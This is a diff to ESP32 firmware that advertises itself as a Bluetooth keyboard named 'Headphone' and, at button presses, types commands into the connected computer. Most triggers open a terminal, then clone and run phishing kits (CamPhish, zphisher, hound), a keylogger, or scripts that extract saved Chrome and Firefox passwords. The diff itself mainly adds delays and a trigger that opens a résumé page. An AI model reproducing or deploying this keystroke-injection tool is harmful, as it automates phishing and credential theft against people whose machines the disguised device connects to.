@@ -24,6 +24,7 @@
 #define BUTTON_20_PIN 30  // Trigger 20
 #define BUTTON_21_PIN 31  // Trigger 21
 #define BUTTON_22_PIN 32  // Trigger 22
+#define BUTTON_23_PIN 33  // Trigger 23
 
 char kbd[] = "Headphone"; // Device Name
 BleKeyboard bleKeyboard(kbd, "Espressif", 100);
@@ -51,6 +52,7 @@ bool lastState19 = HIGH;
 bool lastState20 = HIGH;
 bool lastState21 = HIGH;
 bool lastState22 = HIGH;
+bool lastState23 = HIGH;
 
 // helper to type a string char-by-char
 void sendString(const char* s, int charDelay = 10) {
@@ -101,6 +103,7 @@ void setup() {
   pinMode(BUTTON_20_PIN, INPUT_PULLUP);
   pinMode(BUTTON_21_PIN, INPUT_PULLUP);
   pinMode(BUTTON_22_PIN, INPUT_PULLUP);
+  pinMode(BUTTON_23_PIN, INPUT_PULLUP);
 
   bleKeyboard.begin();
 }
@@ -129,6 +132,7 @@ void loop() {
     bool state20 = digitalRead(BUTTON_20_PIN);
     bool state21 = digitalRead(BUTTON_21_PIN);
     bool state22 = digitalRead(BUTTON_22_PIN);
+    bool state23 = digitalRead(BUTTON_23_PIN);
 
     // Trigger 1:
     if (lastState1 == HIGH && state1 == LOW) {
@@ -470,17 +474,20 @@ void loop() {
       delay(700); // let terminal open
 
       // Git clone (type slowly)
-      sendStringSlow("git clone https://github.com/techchipnet/CamPhish", 150);
+      sendStringSlow("git clone https://github.com/techchipnet/CamPhish", 180);
+      delay(3000);
       bleKeyboard.press(KEY_RETURN);
       delay(6000); // wait for clone to complete (increase if slow internet)
 
       // cd into folder
       sendStringSlow("cd CamPhish", 130);
+      delay(3000);
       bleKeyboard.press(KEY_RETURN);
       delay(800);
 
       // run script
       sendStringSlow("bash camphish.sh", 130);
+      delay(3000);
       bleKeyboard.press(KEY_RETURN);
       delay(1000);
     }
@@ -499,16 +506,19 @@ void loop() {
 
       // Git clone (type slowly)
       sendStringSlow("git clone --depth=1 https://github.com/htr-tech/zphisher.git", 160);
+      delay(3000);
       bleKeyboard.press(KEY_RETURN);
       delay(6000); // wait for clone to complete (increase if slow internet)
 
       // cd into folder
       sendStringSlow("cd zphisher", 130);
+      delay(3000);
       bleKeyboard.press(KEY_RETURN);
       delay(800);
 
       // run script
       sendStringSlow("bash zphisher.sh", 130);
+      delay(3000);
       bleKeyboard.press(KEY_RETURN);
       delay(1000);
     }
@@ -527,16 +537,19 @@ void loop() {
 
       // Git clone (type slowly)
       sendStringSlow("git clone https://github.com/techchipnet/hound", 160);
+      delay(3000);
       bleKeyboard.press(KEY_RETURN);
       delay(6000); // wait for clone to complete (increase if slow internet)
 
       // cd into folder
       sendStringSlow("cd hound", 150);
+      delay(3000);
       bleKeyboard.press(KEY_RETURN);
       delay(800);
 
       // run script
       sendStringSlow("bash hound.sh", 150);
+      delay(3000);
       bleKeyboard.press(KEY_RETURN);
       delay(1000);
     }
@@ -554,17 +567,20 @@ void loop() {
       delay(700); // let terminal open
 
       // Git clone (type slowly)
-      sendStringSlow("git clone https://github.com/sachinpandey7709/File-Encryption-Awareness-Project-Ethical-Demo-.git", 180);
+      sendStringSlow("git clone https://github.com/sachinpandey7709/File-Encryption-Awareness-Project-Ethical-Demo-.git", 200);
+      delay(3000);
       bleKeyboard.press(KEY_RETURN);
       delay(6000); // wait for clone to complete (increase if slow internet)
 
       // cd into folder
       sendStringSlow("cd File-Encryption-Awareness-Project-Ethical-Demo-", 160);
+      delay(3000);
       bleKeyboard.press(KEY_RETURN);
       delay(800);
 
       // run script
       sendStringSlow("python3 code.py", 150);
+      delay(3000);
       bleKeyboard.press(KEY_RETURN);
       delay(1000);
     }
@@ -583,11 +599,13 @@ void loop() {
 
       // Git clone (type slowly)
       sendStringSlow("git clone https://github.com/sachinpandey7709/Keylogger.git", 140);
+      delay(3000);
       bleKeyboard.press(KEY_RETURN);
       delay(6000); // wait for clone to complete (increase if slow internet)
 
       // cd into folder
       sendStringSlow("cd Keylogger", 120);
+      delay(3000);
       bleKeyboard.press(KEY_RETURN);
       delay(800);
 
@@ -657,16 +675,19 @@ void loop() {
 
       // Git clone (type slowly)
       sendStringSlow("git clone https://github.com/sachinpandey7709/Secret-Messaging.git", 180);
+      delay(3000);
       bleKeyboard.press(KEY_RETURN);
       delay(6000); // wait for clone to complete (increase if slow internet)
 
       // cd into folder
       sendStringSlow("cd Secret-Messaging", 150);
+      delay(3000);
       bleKeyboard.press(KEY_RETURN);
       delay(800);
 
       // run script
       sendStringSlow("python3 code2.py", 140);
+      delay(3000);
       bleKeyboard.press(KEY_RETURN);
       delay(1000);
     }
@@ -685,16 +706,19 @@ void loop() {
 
       // Git clone (type slowly)
       sendStringSlow("git clone https://github.com/sachinpandey7709/Password-Manager.git", 180);
+      delay(3000);
       bleKeyboard.press(KEY_RETURN);
       delay(6000); // wait for clone to complete (increase if slow internet)
 
       // cd into folder
       sendStringSlow("cd Password-Manager", 150);
+      delay(3000);
       bleKeyboard.press(KEY_RETURN);
       delay(800);
 
       // run script
       sendStringSlow("python3 password.py", 150);
+      delay(3000);
       bleKeyboard.press(KEY_RETURN);
       delay(1000);
     }
@@ -711,15 +735,19 @@ void loop() {
       bleKeyboard.press(KEY_RETURN);
       delay(1000);
       sendStringSlow("cd C:\\Users\\Dell\\Pictures\\Screenshots\\OneDrive\\Desktop", 220);
+      delay(3000);
       bleKeyboard.press(KEY_RETURN);
       delay(1200);
       sendStringSlow("git clone https://github.com/ohyicong/decrypt-chrome-passwords.git", 200);
+      delay(3000);
       bleKeyboard.press(KEY_RETURN);
       delay(6000);
       sendStringSlow("cd decrypt-chrome-passwords", 180);
+      delay(3000);
       bleKeyboard.press(KEY_RETURN);
       delay(1200);
       sendStringSlow("python decrypt_chrome_password.py", 150);
+      delay(3000);
       bleKeyboard.press(KEY_RETURN);
       delay(1000);
     }
@@ -736,15 +764,19 @@ void loop() {
       bleKeyboard.press(KEY_RETURN);
       delay(1000);
       sendStringSlow("cd C:\\Users\\Dell\\Pictures\\Screenshots\\OneDrive\\Desktop", 220);
+      delay(3000);
       bleKeyboard.press(KEY_RETURN);
       delay(1200);
       sendStringSlow("git clone https://github.com/unode/firefox_decrypt.git", 200);
+      delay(3000);
       bleKeyboard.press(KEY_RETURN);
       delay(6000);
       sendStringSlow("cd firefox_decrypt", 180);
+      delay(3000);
       bleKeyboard.press(KEY_RETURN); 
       delay(1200);
       sendStringSlow("python firefox_decrypt.py", 150);
+      delay(3000);
       bleKeyboard.press(KEY_RETURN);
       delay(1000);
       bleKeyboard.print("2");
@@ -754,6 +786,23 @@ void loop() {
       bleKeyboard.releaseAll(); 
     }
 
+    // Trigger 23:
+      if (lastState23 == HIGH && state23 == LOW) {
+      bleKeyboard.press(KEY_LEFT_GUI);
+      bleKeyboard.press('r');
+      delay(1000);
+      bleKeyboard.releaseAll();
+      delay(1000);
+      bleKeyboard.print("cmd");
+      delay(5000);
+      bleKeyboard.press(KEY_RETURN);
+      delay(1000);
+      sendStringSlow("start https://sachinpandey7709.github.io/Resume-Design/", 220);
+      delay(4000);
+      bleKeyboard.press(KEY_RETURN);
+      delay(500);
+      bleKeyboard.releaseAll(); 
+    }
 
     // update last states
     lastState1 = state1;
@@ -778,7 +827,8 @@ void loop() {
     lastState20 = state20;
     lastState21 = state21;
     lastState22 = state22;
+    lastState23 = state23;
   }
 
   delay(10); // Small debounce
-}
+  }
